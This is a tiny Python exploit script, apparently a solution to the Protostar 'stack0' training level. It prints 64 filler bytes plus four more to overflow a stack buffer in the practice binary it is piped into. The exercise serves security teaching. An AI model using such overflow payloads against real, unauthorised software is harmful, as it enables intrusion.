########################################
# Usage: 
# python stack0.py | /opt/protostar/bin/stack0
########################################

padding = 'A' * 64
target = 'B' * 4
payload = padding + target
print(payload)
